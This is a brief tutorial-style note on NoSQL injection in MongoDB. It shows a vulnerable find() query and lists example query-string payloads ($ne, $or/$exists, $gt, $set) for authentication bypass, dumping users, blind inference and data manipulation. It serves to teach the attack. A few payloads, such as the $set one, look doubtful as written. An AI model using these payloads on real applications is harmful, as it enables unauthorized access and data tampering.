**NoSQL Injection** occurs when an attacker manipulates NoSQL queries by injecting malicious input, leading to unauthorized access or data manipulation. Unlike SQL Injection, it targets NoSQL databases like MongoDB, which use flexible query structures.


---
## Cheat Sheets
It is very important to consult these resources available in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) to correctly execute a [NoSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) attack .


---


## Example of NoSQL Injection:

Consider the following query in MongoDB:
```ruby
db.users.find({ name: req.query.name })
```

An attacker could inject input like this:

```ruby
https://example.com?name[$ne]=admin
```

This translates to a query like:

```ruby
db.users.find({ name: { "$ne": "admin" } })
```

This would bypass the login check by returning all users except the one with the name "admin", potentially exposing sensitive data.


## Other NoSQL Injection Payloads

- **Bypass Authentication**  
This payload forces the query to return true, bypassing authentication.
```ruby
https://example.com?name[$ne]=null
```

- **Retrieve All Users**  
This payload retrieves all users by bypassing name checks.

```ruby
https://example.com?name[$or][0][$exists]=true&name[$or][1]=$ne
```

- **Blind Injection**  
This payload tests conditions to infer data without direct feedback.
```ruby
https://example.com?name[$gt]=a
```

- **Data Manipulation**  
This payload can be used to update or insert data into the database
```ruby
https://example.com?name[$set]=admin&password[$set]=password123
```